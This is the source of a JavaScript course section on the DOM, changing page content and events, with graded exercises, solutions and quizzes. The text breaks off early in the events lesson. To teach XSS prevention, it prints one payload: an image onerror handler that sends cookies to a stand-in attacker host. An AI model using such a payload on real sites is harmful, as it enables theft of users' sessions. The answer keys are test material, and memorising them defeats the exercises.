@@@ part
id: 5
title: JavaScript in the browser
level: Intermediate
blurb: Making web pages interactive: how the browser turns HTML into the DOM, finding and changing elements safely, reacting to clicks and typing with events, reading and validating forms, and a final project that fetches data and renders it with loading, error and search states. Every example runs as a live page in the preview.

@@@ lesson
id: the-dom
title: Web pages and the DOM
minutes: 24
summary: What HTML, CSS and JavaScript each do, how the page preview works, the DOM tree of element and text nodes, where to put script tags (end of body, defer, modules), selecting elements with CSS selectors (querySelector, querySelectorAll, getElementById), reading text, attributes, properties and data- attributes, and moving around the tree with closest, parentElement and children.
---
Until now your code printed text. In a browser, JavaScript's main job is the **page**: showing data, reacting to clicks, checking forms. A web page is built from three languages, each with its own job:

| Language | Job | Example |
|---|---|---|
| **HTML** | structure and content | `<button>Add to cart</button>` |
| **CSS** | how it looks | `button { color: white; background: teal; }` |
| **JavaScript** | behaviour | run code when the button is clicked |

### Your first page

From this lesson on, most examples are whole HTML pages. Press **Run** and the page opens in the **preview** above the output, where you can click and type in it; anything the page's code logs appears in the output below it.

```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Bike shop</title>
  <style>
    body { font-family: system-ui, sans-serif; margin: 16px; }
    .note { color: #555; }
  </style>
</head>
<body>
  <h1>Bike shop</h1>
  <p class="note">Everything you need for a puncture.</p>
  <button>Say hello</button>

  <script>
    console.log("The page title is:", document.title);
    document.querySelector("button").addEventListener("click", () => {
      console.log("Hello from the button!");
    });
  </script>
</body>
</html>
```

Click **Say hello** in the preview a few times: each click logs a line. The `<script>` element holds the JavaScript; `document` is the page, and `querySelector("button")` finds the button so the code can listen for clicks (events are Lesson 28).

About the preview:

- It's a real page in a **sandboxed** frame: it can't touch the course page, your saved progress or your cookies.
- Lines in error messages match the lines in the editor.
- `alert`, `confirm` and `prompt` write to the output instead of opening a dialog.
- A page that never stops (an endless loop) can freeze the whole tab, just like a real website. If that happens, reload this page: your code is saved.

Short examples can leave out `<!doctype html>`, `<head>` and `<body>`: the browser adds them. Real pages should always start with `<!doctype html>`, which switches the browser to standards mode.

### The DOM: the page as objects

When the browser reads HTML, it builds a tree of objects called the **DOM** (Document Object Model). Every tag becomes an **element node**, and the text inside becomes **text nodes**. JavaScript never edits the HTML file; it reads and changes this tree, and the browser redraws the page to match.

![An HTML snippet on the left, a body containing an h1 and a ul with two li items, and on the right the DOM tree the browser builds from it: body at the top, h1 and ul#list as its children, the li elements under the ul, and the text "Shop", "Bell" and "Pump" as text nodes at the leaves](figures/dom-tree.svg)

```html
<ul id="list">
  <li class="item">Bell</li>
  <li class="item">Pump</li>
</ul>
<script>
  const list = document.getElementById("list");
  console.log(list);                              // the element, shown as its opening tag
  console.log(list.tagName);                      // UL
  console.log(list.children.length);              // 2: only the elements
  console.log(list.childNodes.length);            // 5: the elements and the whitespace text between them
  console.log(list.firstElementChild.textContent);
</script>
```

The line breaks and spaces between tags are text nodes too, which is why `childNodes` has 5 entries. You'll almost always want the **element** versions (`children`, `firstElementChild`, `parentElement`), which skip them.

`document` is your way in: `document.body` is the `<body>` element, `document.title` the tab title, and `document.documentElement` the `<html>` element.

### Where the script goes

A `<script>` runs **as soon as the browser reaches it**, and it can only find elements that are above it in the page. That gives three common choices:

```html-static
<!-- 1. At the end of <body>: everything above it already exists. -->
<body>
  <h1>Shop</h1>
  <script src="app.js"></script>
</body>

<!-- 2. In <head> with defer: downloads in parallel, runs after the HTML is parsed, in order. -->
<head>
  <script src="app.js" defer></script>
</head>

<!-- 3. A module: deferred automatically, and import / export work (Lesson 17). -->
<head>
  <script type="module" src="app.js"></script>
</head>
```

Real projects use 2 or 3; this course's examples use 1 because the code sits in the same file. A script in `<head>` without `defer` that looks for an element gets `null`, the cause of the most common beginner error, `Cannot read properties of null`.

The `DOMContentLoaded` event fires when the HTML has been fully read (before images finish loading); `load` fires after everything, images included. With `defer` or modules you rarely need either.

### Finding elements

`querySelector` takes a **CSS selector**, the same patterns CSS uses to style elements, and returns the **first** match or `null`. `querySelectorAll` returns **all** matches as a `NodeList`.

| Selector | Matches |
|---|---|
| `button` | every `<button>` element |
| `#title` | the element with `id="title"` |
| `.item` | elements with `class="item"` (among others) |
| `li.item.sale` | `<li>` elements with both classes |
| `[data-stock="0"]` | elements with that attribute value |
| `ul > li` | `<li>` elements that are direct children of a `<ul>` |
| `#cart li` | `<li>` elements anywhere inside `#cart` |
| `li:first-child`, `input:checked` | pseudo-classes: position and state |

```html
<h1 id="title">Parts</h1>
<ul>
  <li class="item" data-stock="42">Inner tube</li>
  <li class="item sale" data-stock="0">Tubeless tyre</li>
  <li class="item" data-stock="60">Puncture kit</li>
</ul>
<script>
  console.log(document.querySelector("#title").textContent);     // Parts
  console.log(document.querySelector(".item").textContent);      // the FIRST match only

  const items = document.querySelectorAll("li.item");            // every match
  console.log(items.length);
  items.forEach((li) => console.log("-", li.textContent));

  console.log(document.querySelector('[data-stock="0"]').textContent);
  console.log(document.querySelector(".missing"));               // null: nothing matched

  const names = [...items].map((li) => li.textContent);          // a NodeList has forEach, but not map
  console.log(names);
</script>
```

A few things to know:

- `querySelectorAll` returns a **static** snapshot: elements added later aren't in it. Query again when the page changes.
- A `NodeList` has `forEach` and `length` but not `map` or `filter`; spread it into an array (`[...list]` or `Array.from(list)`) first.
- `getElementById("title")` (no `#`) is the older, slightly faster way to find one element by id. Both are fine.
- You can call `querySelector` on any element to search only inside it: `cart.querySelectorAll("li")`.

### Reading what's there

| To read | Use | Gives |
|---|---|---|
| the text inside | `el.textContent` | all the text, including hidden elements, as a string |
| the text as shown | `el.innerText` | only visible text, laid out like the screen (slower) |
| an attribute as written | `el.getAttribute("href")` | a string, or `null` |
| a property | `el.id`, `input.value`, `input.checked`, `link.href` | the live value, sometimes processed (`href` is the full URL) |
| a `data-` attribute | `el.dataset.productId` for `data-product-id` | a string, or `undefined` |

```html
<input id="qty" type="number" value="2">
<li id="pump" data-product-id="4" data-price="3200">Floor pump <b>(sale)</b></li>
<script>
  const qty = document.querySelector("#qty");
  console.log(qty.value, typeof qty.value);          // input values are always strings
  console.log(qty.valueAsNumber);                    // number inputs can give a number

  const pump = document.querySelector("#pump");
  console.log(pump.textContent);                     // text from every child, tags removed
  console.log(pump.getAttribute("data-price"));
  console.log(pump.dataset);                         // data-product-id becomes productId
  console.log(Number(pump.dataset.price) / 100);     // convert before doing maths
</script>
```

**`data-` attributes** are how HTML carries extra information for your code, like a product id on a button. Their values are always **strings**: `"0"` is truthy, and `"10" < "9"` is true, so convert with `Number()` before comparing or adding.

### Moving around the tree

```html
<ul id="cart">
  <li data-id="2">Bell <button class="remove">Remove</button></li>
  <li data-id="4">Floor pump <button class="remove">Remove</button></li>
</ul>
<script>
  const button = document.querySelector('li[data-id="4"] .remove');
  const item = button.closest("li");                     // the nearest ancestor (or itself) that matches
  console.log(item.dataset.id);
  console.log(item.parentElement.id);
  console.log(item.previousElementSibling.dataset.id);
  console.log(button.matches(".remove"));                // does this element match a selector?
  console.log(item.closest(".nope"));                    // null: no ancestor matches
</script>
```

`closest` is the one you'll use most: from a clicked button, find the item it belongs to. It's the key to event delegation in Lesson 28.

:::exercise Names in stock
The page lists products, each `<li>` with a `data-stock` attribute. Write `function inStock()` that returns an **array of the names** (each `<li>`'s text, trimmed) of the products whose stock is **more than 0**, in page order.

It must read the page **each time it's called**: the checks change the page and call it again. Keep your code in the normal `<script>` (not `type="module"`) so the checks can find your function.
```html starter
<!doctype html>
<html lang="en">
<body>
  <h1>Parts</h1>
  <ul id="products">
    <li data-id="1" data-stock="42">Inner tube</li>
    <li data-id="3" data-stock="0">Tubeless tyre</li>
    <li data-id="4" data-stock="7">Floor pump</li>
    <li data-id="6" data-stock="60">Puncture kit</li>
  </ul>

  <script>
    function inStock() {
      // your code here
    }

    console.log(inStock());   // [ 'Inner tube', 'Floor pump', 'Puncture kit' ]
  </script>
</body>
</html>
```
```js check
const fn = need("inStock", "function");
same(fn(), ["Inner tube", "Floor pump", "Puncture kit"], "inStock()");
// The page changes: the pump sells out and a bell arrives (with spaces around its name).
$('#products [data-id="4"]').dataset.stock = "0";
const li = document.createElement("li");
li.dataset.id = "2";
li.dataset.stock = "15";
li.textContent = "  Bell  ";
$("#products").append(li);
same(fn(), ["Inner tube", "Puncture kit", "Bell"], "inStock() after the page changed (the pump sold out, a bell was added)");
```
```html solution
<!doctype html>
<html lang="en">
<body>
  <h1>Parts</h1>
  <ul id="products">
    <li data-id="1" data-stock="42">Inner tube</li>
    <li data-id="3" data-stock="0">Tubeless tyre</li>
    <li data-id="4" data-stock="7">Floor pump</li>
    <li data-id="6" data-stock="60">Puncture kit</li>
  </ul>

  <script>
    function inStock() {
      return [...document.querySelectorAll("#products li")]
        .filter((li) => Number(li.dataset.stock) > 0)
        .map((li) => li.textContent.trim());
    }

    console.log(inStock());
  </script>
</body>
</html>
```
hint: `document.querySelectorAll("#products li")` finds every item. Spread it into an array (`[...]`) so you can use `filter` and `map`.
hint: `li.dataset.stock` is a **string**, and `"0"` is truthy. Convert it: `Number(li.dataset.stock) > 0`.
hint: `.map((li) => li.textContent.trim())`, and do the query **inside** the function so each call sees the current page.
approach:
1. **Understand:** select the items, keep those with stock above 0, return their trimmed names.
2. **Examples:** stock "0" → left out; "  Bell  " → "Bell".
3. **Brute force:** a `for…of` loop over the NodeList, pushing names into an array. That works too.
4. **Pattern:** **select → filter → map**, the array pipeline from Lesson 10 applied to elements.
5. **Plan:** query inside the function → spread → filter on `Number(dataset.stock)` → map to trimmed text.
6. **Code and test:** run it, then add `data-stock="0"` to another item in the HTML and run again.
walkthrough:
**Line by line**

- `document.querySelectorAll("#products li")` returns a NodeList of the `<li>` elements inside `#products`, in page order.
- `[...]` turns it into a real array, so `filter` and `map` are available.
- `Number(li.dataset.stock) > 0` reads `data-stock` as a string and converts it; comparing the string directly (`li.dataset.stock > 0`) happens to work through coercion, but `if (li.dataset.stock)` would keep `"0"`.
- `li.textContent.trim()` removes the spaces and line breaks around the name.

**Trace:** the first call keeps tube (42), pump (7) and kit (60). After the changes, pump is `"0"` and is dropped; the new bell (15) is added at the end: tube, kit, bell.

**Common wrong approach:** running `querySelectorAll` once at the top of the script and reusing the result: that list is a snapshot, so the bell added later is never seen.
:::

:::exercise Total of an order table
Each row of the order table has the product's price in pence in `data-price`, and the quantity as the text of its `.qty` cell. Write `function orderTotal()` that returns the order's total in pence (price × quantity, added up over every row in the `<tbody>`).
```html starter
<!doctype html>
<html lang="en">
<body>
  <table id="order">
    <thead><tr><th>Item</th><th>Qty</th></tr></thead>
    <tbody>
      <tr data-price="600"><td>Inner tube</td><td class="qty">2</td></tr>
      <tr data-price="800"><td>Bell</td><td class="qty">1</td></tr>
      <tr data-price="450"><td>Puncture kit</td><td class="qty">3</td></tr>
    </tbody>
  </table>

  <script>
    function orderTotal() {
      // your code here
    }

    console.log(orderTotal());   // 3350
  </script>
</body>
</html>
```
```js check
const fn = need("orderTotal", "function");
same(fn(), 3350, "orderTotal()");
$("#order tbody tr:nth-child(2) .qty").textContent = " 4 ";
const row = document.createElement("tr");
row.dataset.price = "3200";
row.innerHTML = "<td>Floor pump</td><td class='qty'>1</td>";
$("#order tbody").append(row);
same(fn(), 1200 + 3200 + 1350 + 3200, "orderTotal() after the bell's quantity changed to 4 and a floor pump row was added");
$("#order tbody").replaceChildren();
same(fn(), 0, "orderTotal() for an empty table");
```
```html solution
<!doctype html>
<html lang="en">
<body>
  <table id="order">
    <thead><tr><th>Item</th><th>Qty</th></tr></thead>
    <tbody>
      <tr data-price="600"><td>Inner tube</td><td class="qty">2</td></tr>
      <tr data-price="800"><td>Bell</td><td class="qty">1</td></tr>
      <tr data-price="450"><td>Puncture kit</td><td class="qty">3</td></tr>
    </tbody>
  </table>

  <script>
    function orderTotal() {
      let total = 0;
      for (const row of document.querySelectorAll("#order tbody tr")) {
        const price = Number(row.dataset.price);
        const qty = Number(row.querySelector(".qty").textContent);
        total += price * qty;
      }
      return total;
    }

    console.log(orderTotal());
  </script>
</body>
</html>
```
hint: Loop over `document.querySelectorAll("#order tbody tr")` with `for…of` (NodeLists are iterable). Selecting inside `tbody` skips the header row.
hint: In each row, `row.dataset.price` is the price and `row.querySelector(".qty").textContent` is the quantity. Both are strings.
hint: Convert both with `Number()` (it ignores spaces around a number), multiply, and add to a total that starts at `0`.
approach:
1. **Understand:** a sum over rows of price × quantity, read from the page.
2. **Examples:** 600×2 + 800×1 + 450×3 = 3350; an empty table → 0.
3. **Brute force:** reading every `<td>` and guessing which is which: fragile. Use the `.qty` class and `data-price`.
4. **Pattern:** **query rows, then query inside each row**, and convert strings to numbers.
5. **Plan:** total = 0 → for each body row: price, qty → total += price × qty → return.
6. **Code and test:** change a quantity in the HTML and run again.
walkthrough:
**Line by line**

- `#order tbody tr` selects only the body rows, so the `<thead>` row (which has no price) is skipped.
- `row.querySelector(".qty")` searches **inside that row**, so each row finds its own quantity cell.
- `Number(" 4 ")` is 4: `Number` trims whitespace. (`parseInt` would also work here.)
- The total starts at the number `0`, so `+=` adds numbers.

**Trace:** 1200 + 800 + 1350 = 3350. After the changes: 1200 + 3200 + 1350 + 3200 = 8950. Empty body: the loop never runs, so 0.

**Common wrong approach:** `total += row.dataset.price * row.querySelector(".qty").textContent` happens to work because `*` converts strings, but writing `total = total + price` with an unconverted price string concatenates: `"0600800…"`. Convert explicitly.
:::

:::quiz
? A script in <head> without defer runs document.querySelector("#cart") for a <ul id="cart"> in the body. What does it get?
+ null, because the element hasn't been parsed yet
- The ul element
- An error: querySelector can't run in head
= Scripts run when the parser reaches them. Move the script to the end of body, or add defer.
? What does document.querySelector(".item") return when there are three .item elements?
+ The first one
- All three, in a NodeList
- The last one
= Use querySelectorAll for every match.
? li has data-stock="0". What is Boolean(li.dataset.stock)?
+ true, because "0" is a non-empty string
- false
- 0
= data- attributes are always strings; convert with Number() first.
? Which finds the li that contains a clicked button?
+ button.closest("li")
- button.parentElement.parentElement
- document.querySelector("li")
= closest walks up the tree to the nearest match, however deep the button is nested.
:::

@@@ lesson
id: changing-the-page
title: Changing the page
minutes: 26
summary: Setting text safely with textContent, why innerHTML with user data is a security hole (XSS) and what to use instead (including setHTML), creating, inserting, moving and removing elements, attributes and properties, the hidden and disabled properties, classList and styles, cloning a template element, and building a list in one update.
---
Reading the page is half the story. Most front-end code **changes** it: shows a cart, marks an item sold out, hides a message. All of that is done by changing the DOM; the browser redraws the screen for you.

### Text: textContent, and the trouble with innerHTML

Set `textContent` to replace everything inside an element with **plain text**. `innerHTML` instead **parses** the string as HTML:

```html
<p id="a"></p>
<p id="b"></p>
<script>
  const name = "<b>Bell</b> & <i>light</i>";
  document.querySelector("#a").textContent = name;     // shown exactly as written
  document.querySelector("#b").innerHTML = name;       // parsed: bold and italic elements
  console.log(document.querySelector("#a").innerHTML); // the special characters were escaped
  console.log(document.querySelector("#b").children.length);
</script>
```

Parsing is exactly what makes `innerHTML` dangerous. Suppose a product review comes from a user:

```js-static
const review = '<img src="x" onerror="sendCookiesTo(\'evil.example\')">';
reviewBox.innerHTML = review;     // the image fails to load, and the attacker's code runs on YOUR page
reviewBox.textContent = review;   // safe: the text is shown, nothing runs
```

This is **cross-site scripting (XSS)**, one of the most common web security bugs: the attacker's code runs with your page's access to its users' data. The rules:

- Put **any data you didn't write yourself** (user input, API responses, URL parameters, LLM output) into the page with `textContent`, or by creating elements (below).
- Use `innerHTML` only with HTML **you wrote**, with no data mixed in.
- If you really must show user-written HTML, sanitize it. The new `el.setHTML(html)` removes scripts and event-handler attributes before inserting; it shipped in Firefox 148 and Chrome and Edge 146 in early 2026, but not yet in every browser, so check before relying on it, or use a library such as DOMPurify.

Frameworks such as React, Vue and Svelte escape text automatically for the same reason.

### Creating and inserting elements

`document.createElement(tag)` makes a new, detached element; it appears only when you insert it.

```html
<ul id="cart"><li>Bell</li></ul>
<script>
  const cart = document.querySelector("#cart");

  const li = document.createElement("li");
  li.textContent = "Floor pump";
  li.dataset.id = "4";
  cart.append(li);                                   // last child

  const first = document.createElement("li");
  first.textContent = "Inner tube";
  cart.prepend(first);                               // first child

  cart.append("plain text works too");               // strings become text nodes
  console.log([...cart.children].map((el) => el.textContent));

  li.remove();                                       // take it out of the page
  console.log(cart.children.length);
</script>
```

| Method | Puts the new nodes |
|---|---|
| `parent.append(a, b, …)` | at the end, inside `parent` |
| `parent.prepend(…)` | at the start, inside `parent` |
| `el.before(…)` / `el.after(…)` | just before / after `el`, as siblings |
| `el.replaceWith(…)` | in place of `el` |
| `parent.replaceChildren(…)` | instead of everything in `parent` (no arguments: empties it) |
| `el.remove()` | removes `el` |

An element can only be in one place: appending an element that's already in the page **moves** it. `el.cloneNode(true)` makes a copy (`true` copies its children too).

### Attributes, properties and state

Most attributes have a matching property, and properties are usually what you want:

```html
<button id="buy" class="btn">Add to cart</button>
<p id="msg" hidden>Added!</p>
<script>
  const buy = document.querySelector("#buy");
  buy.disabled = true;                          // a property: true/false
  console.log(buy.outerHTML);                   // the disabled attribute appeared
  buy.disabled = false;

  buy.setAttribute("aria-label", "Add the bell to your cart");   // any attribute
  console.log(buy.getAttribute("aria-label"));
  buy.removeAttribute("aria-label");

  const msg = document.querySelector("#msg");
  msg.hidden = false;                           // show it (hidden = true hides it)
  console.log(msg.hidden, msg.textContent);
</script>
```

`hidden`, `disabled`, `checked` and `selected` are **boolean attributes**: present means on, absent means off. Set them through their properties (`buy.disabled = true`); `setAttribute("disabled", "false")` would *disable* the button, because the attribute is present.

### Classes and styles

Keep the look in CSS and switch **classes** from JavaScript; it's tidier than setting styles one by one, and a designer can change the CSS without touching your code.

```html
<style>
  .card { padding: 8px; border: 1px solid #ccc; }
  .sold-out { opacity: .5; }
  .selected { outline: 3px solid teal; }
</style>
<div class="card" id="tyre">Tubeless tyre</div>
<script>
  const tyre = document.querySelector("#tyre");
  tyre.classList.add("sold-out");
  tyre.classList.toggle("selected");                   // add if missing, remove if present
  console.log(tyre.className);
  tyre.classList.toggle("selected", false);            // with a second argument: force on or off
  console.log(tyre.classList.contains("selected"));
  tyre.style.backgroundColor = "#fff4e0";              // CSS property names become camelCase
  tyre.style.setProperty("--accent", "teal");          // CSS custom properties keep their name
  console.log(tyre.getAttribute("style"));
</script>
```

Use `style` for values that really are computed, like a progress bar's width; use classes for states like "selected" or "sold out".

### Templates

For anything bigger than one element, write the HTML once in a `<template>`. Its content isn't shown; you clone it for each item and fill in the blanks:

```html
<template id="row">
  <li class="product"><span class="name"></span> <b class="price"></b></li>
</template>
<ul id="list"></ul>
<script>
  const products = [{ name: "Bell", price: 800 }, { name: "Floor pump", price: 3200 }];
  const template = document.querySelector("#row");
  const items = products.map((p) => {
    const li = template.content.firstElementChild.cloneNode(true);
    li.querySelector(".name").textContent = p.name;              // still textContent: safe
    li.querySelector(".price").textContent = `£${(p.price / 100).toFixed(2)}`;
    return li;
  });
  document.querySelector("#list").replaceChildren(...items);     // one update to the page
  console.log(document.querySelector("#list").children.length);
</script>
```

`template.content` is a document fragment holding the template's nodes; `firstElementChild.cloneNode(true)` copies the `<li>` with everything inside.

### Update the page in one go

Each change to the page can make the browser recalculate the layout. Building all the new elements first and inserting them once (`replaceChildren(...items)` or `append(...items)`) is simpler and faster than inserting them one by one into a visible list. Also avoid alternating writes with layout reads such as `el.offsetHeight` inside a loop, which forces a recalculation on every read (**layout thrashing**).

:::exercise Render the cart
Write `function renderCart(items)` that shows the cart in the page. `items` is an array of `{ name, qty, price }` (price in pence).

- Replace everything in `<ul id="cart">` with one `<li>` per item, with the text `Bell x 2: £16.00` (name, `x`, quantity, `:`, then price × qty in pounds with 2 decimals).
- If the cart is empty, show a single `<li class="empty">Your cart is empty</li>`.
- Set the text of `<p id="total">` to `Total: £` plus the total in pounds with 2 decimals.

Names come from users, so they must appear as text, never as HTML. Calling `renderCart` again must replace the list, not add to it.
```html starter
<!doctype html>
<html lang="en">
<body>
  <h2>Your cart</h2>
  <ul id="cart"></ul>
  <p id="total"></p>

  <script>
    function renderCart(items) {
      // your code here
    }

    renderCart([{ name: "Bell", qty: 2, price: 800 }, { name: "Inner tube", qty: 1, price: 600 }]);
  </script>
</body>
</html>
```
```js check
const render = need("renderCart", "function");
const lines = () => $$("#cart li").map((li) => li.textContent.trim());
render([{ name: "Bell", qty: 2, price: 800 }, { name: "Inner tube", qty: 1, price: 600 }]);
same(lines(), ["Bell x 2: £16.00", "Inner tube x 1: £6.00"], "The cart list");
same(text("#total"), "Total: £22.00", "The total");
render([{ name: "Puncture kit", qty: 3, price: 450 }]);
same(lines(), ["Puncture kit x 3: £13.50"], "The cart list after calling renderCart again (replace, don't add)");
same(text("#total"), "Total: £13.50", "The total after the second call");
render([{ name: "<b>Bold</b> & co", qty: 1, price: 5 }]);
same(lines(), ["<b>Bold</b> & co x 1: £0.05"], "A name containing HTML characters (it must be shown as text)");
if ($("#cart b")) throw new AssertionError("The name was inserted as HTML: a <b> element appeared. Use textContent so data can't add elements (or scripts) to your page.");
render([]);
same(lines(), ["Your cart is empty"], "An empty cart");
if (!$("#cart li.empty")) throw new AssertionError('The empty-cart line needs class="empty".');
same(text("#total"), "Total: £0.00", "The total of an empty cart");
```
```html solution
<!doctype html>
<html lang="en">
<body>
  <h2>Your cart</h2>
  <ul id="cart"></ul>
  <p id="total"></p>

  <script>
    const pounds = (pence) => `£${(pence / 100).toFixed(2)}`;

    function renderCart(items) {
      const lines = items.map((item) => {
        const li = document.createElement("li");
        li.textContent = `${item.name} x ${item.qty}: ${pounds(item.price * item.qty)}`;
        return li;
      });
      if (lines.length === 0) {
        const empty = document.createElement("li");
        empty.className = "empty";
        empty.textContent = "Your cart is empty";
        lines.push(empty);
      }
      document.querySelector("#cart").replaceChildren(...lines);
      const total = items.reduce((sum, item) => sum + item.price * item.qty, 0);
      document.querySelector("#total").textContent = `Total: ${pounds(total)}`;
    }

    renderCart([{ name: "Bell", qty: 2, price: 800 }, { name: "Inner tube", qty: 1, price: 600 }]);
  </script>
</body>
</html>
```
hint: For each item, `document.createElement("li")`, then set its `textContent` to the line. Building the text with a template literal is fine because `textContent` never parses it.
hint: `(pence / 100).toFixed(2)` gives `"16.00"`. A small `pounds(pence)` helper keeps it in one place.
hint: Finish with `cart.replaceChildren(...lines)`, which removes the old lines and inserts the new ones in one step. Add the `empty` line when there are no items.
approach:
1. **Understand:** turn data into elements, replace the old ones, show a total; empty cart is a special case.
2. **Examples:** `[]` → one "Your cart is empty" line and £0.00; a name with `<b>` → shown literally.
3. **Brute force:** `cart.innerHTML += "<li>" + name + …`: duplicates on the second call and lets names inject HTML.
4. **Pattern:** **render from data**: build the elements from the array, then replace the container's children.
5. **Plan:** map items → `<li>`s → add the empty line if needed → `replaceChildren` → total with `reduce` → set `#total`.
6. **Code and test:** call it twice with different carts, then with `[]`.
walkthrough:
**Line by line**

- `pounds` formats pence once, so the lines and the total can't disagree.
- `items.map` creates one `<li>` per item; `textContent` puts the line in as plain text, so `<b>Bold</b>` is displayed, not obeyed.
- For an empty cart, `lines` gets a single `<li class="empty">`.
- `replaceChildren(...lines)` empties the `<ul>` and inserts the new lines: calling `renderCart` twice shows only the second cart.
- `reduce` adds price × qty over the items; for `[]` it returns the starting value 0.

**Trace:** Bell 2 × 800 = 1600 → "Bell x 2: £16.00"; tube 600; total 2200 → "Total: £22.00".

**Common wrong approach:** `cart.innerHTML += \`<li>${item.name}…</li>\``: each call appends instead of replacing, and a name like `<img src=x onerror=…>` would run code in your page.
:::

:::exercise Product cards from a template
The page has a `<template id="card-tpl">` for one product card and an empty `<div id="grid">`. Write `function renderCards(products)` that fills the grid with one card per product (each `{ id, name, price, stock }`, price in pence):

- clone the template's `<article>` for each product;
- set `.name` to the name and `.price` to the price in pounds, like `£6.00`;
- set the article's `data-id` attribute to the product's id;
- if `stock` is 0, add the class `sold-out` to the article, disable its `.buy` button and change the button's text to `Sold out`.

Calling it again must replace the cards.
```html starter
<!doctype html>
<html lang="en">
<head>
  <style>
    #grid { display: flex; gap: 8px; flex-wrap: wrap; font-family: system-ui, sans-serif; }
    .card { border: 1px solid #ccc; border-radius: 8px; padding: 8px 12px; }
    .sold-out { opacity: .5; }
  </style>
</head>
<body>
  <template id="card-tpl">
    <article class="card">
      <h3 class="name"></h3>
      <p class="price"></p>
      <button class="buy">Add to cart</button>
    </article>
  </template>
  <div id="grid"></div>

  <script>
    function renderCards(products) {
      // your code here
    }

    renderCards([
      { id: 1, name: "Inner tube", price: 600, stock: 42 },
      { id: 3, name: "Tubeless tyre", price: 4500, stock: 0 },
    ]);
  </script>
</body>
</html>
```
```js check
const render = need("renderCards", "function");
const products = [
  { id: 1, name: "Inner tube", price: 600, stock: 42 },
  { id: 3, name: "Tubeless tyre", price: 4500, stock: 0 },
  { id: 6, name: "Puncture kit", price: 450, stock: 60 },
];
render(products);
const cards = $$("#grid article");
same(cards.length, 3, "The number of cards in #grid");
same(cards.map((c) => text(c.querySelector(".name"))), ["Inner tube", "Tubeless tyre", "Puncture kit"], "The list of card names");
same(cards.map((c) => text(c.querySelector(".price"))), ["£6.00", "£45.00", "£4.50"], "The list of card prices");
same(cards.map((c) => c.dataset.id), ["1", "3", "6"], "The list of data-id values");
same(cards.map((c) => c.classList.contains("sold-out")), [false, true, false], "The sold-out class on each card");
const buttons = cards.map((c) => c.querySelector("button.buy"));
if (buttons.some((b) => !b)) throw new AssertionError("Each card should keep the template's <button class=\"buy\">: clone the template instead of building new markup.");
same(buttons.map((b) => b.disabled), [false, true, false], "The disabled state of each button");
same(buttons.map((b) => text(b)), ["Add to cart", "Sold out", "Add to cart"], "The text of each button");
render([{ id: 2, name: "<i>Bell</i>", price: 800, stock: 15 }]);
same($$("#grid article").length, 1, "The number of cards after calling renderCards again (replace them)");
same(text("#grid .name"), "<i>Bell</i>", "A name containing HTML characters (show it as text)");
if (!uses("content")) throw new AssertionError("Clone the template's content (template.content…cloneNode(true)).");
```
```html solution
<!doctype html>
<html lang="en">
<head>
  <style>
    #grid { display: flex; gap: 8px; flex-wrap: wrap; font-family: system-ui, sans-serif; }
    .card { border: 1px solid #ccc; border-radius: 8px; padding: 8px 12px; }
    .sold-out { opacity: .5; }
  </style>
</head>
<body>
  <template id="card-tpl">
    <article class="card">
      <h3 class="name"></h3>
      <p class="price"></p>
      <button class="buy">Add to cart</button>
    </article>
  </template>
  <div id="grid"></div>

  <script>
    const template = document.querySelector("#card-tpl");

    function renderCards(products) {
      const cards = products.map((p) => {
        const card = template.content.firstElementChild.cloneNode(true);
        card.dataset.id = p.id;
        card.querySelector(".name").textContent = p.name;
        card.querySelector(".price").textContent = `£${(p.price / 100).toFixed(2)}`;
        if (p.stock === 0) {
          card.classList.add("sold-out");
          const buy = card.querySelector(".buy");
          buy.disabled = true;
          buy.textContent = "Sold out";
        }
        return card;
      });
      document.querySelector("#grid").replaceChildren(...cards);
    }

    renderCards([
      { id: 1, name: "Inner tube", price: 600, stock: 42 },
      { id: 3, name: "Tubeless tyre", price: 4500, stock: 0 },
    ]);
  </script>
</body>
</html>
```
hint: `template.content.firstElementChild.cloneNode(true)` gives you a fresh `<article>` with everything inside it.
hint: Inside the clone, `card.querySelector(".name").textContent = p.name`, and `card.dataset.id = p.id` sets the `data-id` attribute (the number becomes the string `"1"`).
hint: For sold-out products: `card.classList.add("sold-out")`, then on the button `disabled = true` and `textContent = "Sold out"`. End with `grid.replaceChildren(...cards)`.
approach:
1. **Understand:** one card per product, from a template, with a sold-out state.
2. **Examples:** stock 0 → faded card, disabled "Sold out" button; 450 pence → "£4.50".
3. **Brute force:** building each card's HTML in a string with the name inside: unsafe and duplicates the template.
4. **Pattern:** **template + clone + fill**, then a single `replaceChildren`.
5. **Plan:** find the template once → map products to filled clones → apply the sold-out state → replace the grid's children.
6. **Code and test:** render twice; try a product name with `<` in it.
walkthrough:
**Line by line**

- The template is looked up once; `template.content` holds its nodes without showing them.
- `cloneNode(true)` copies the article with its heading, paragraph and button, so the markup lives only in the HTML.
- `card.dataset.id = p.id` creates `data-id="1"`; datasets store strings.
- `textContent` keeps names safe; `toFixed(2)` formats the pounds.
- The sold-out branch changes three things that belong together: class (look), `disabled` (behaviour) and text (meaning, also for screen readers).
- `replaceChildren(...cards)` swaps the old cards for the new ones in one update.

**Trace:** the tyre has stock 0 → `class="card sold-out"`, button disabled with "Sold out"; the others keep "Add to cart".

**Common wrong approach:** cloning `template` itself, or appending `template.content` directly: the first copies the invisible `<template>` element, and the second empties the template after the first use, so the next call has nothing to clone.
:::

:::quiz
? Which line safely shows a username typed by a visitor?
+ el.textContent = username
- el.innerHTML = username
- el.innerHTML = `<b>${username}</b>`
= textContent never parses HTML, so nothing in the name can run.
? What does parent.replaceChildren() with no arguments do?
+ Removes all of parent's children
- Nothing
- Throws an error
= It replaces the children with nothing; pass elements to replace them with those.
? You run button.setAttribute("disabled", "false"). What happens?
+ The button is disabled, because the attribute is present
- The button is enabled
- An error is thrown
= Boolean attributes are on whenever present; use button.disabled = false.
? You append an element that is already in the page to another list. What happens?
+ It moves to the new place
- A copy is added and the original stays
- An error is thrown
= An element has one position; use cloneNode(true) for a copy.
:::

@@@ lesson
id: events
title: Events
minutes: 26
summary: Listening with addEventListener, the event object (type, target, currentTarget, key), common events (click, input, change, keydown, submit), preventing default actions, capturing and bubbling, event delegation for many or changing elements, removing listeners (once, AbortController signals), custom events, and accessible clickable elements.
---
A page waits for things to happen: a click, a key press, text typed into a box. Each of these is an **event**, and your code reacts by **listening** for it.

### Listening

```html
<button id="like">Like</button>
<p id="count">0 likes</p>
<script>
  let likes = 0;
  const button = document.querySelector("#like");

  button.addEventListener("click", (event) => {
    likes++;
    document.querySelector("#count").textContent = `${likes} like${likes === 1 ? "" : "s"}`;
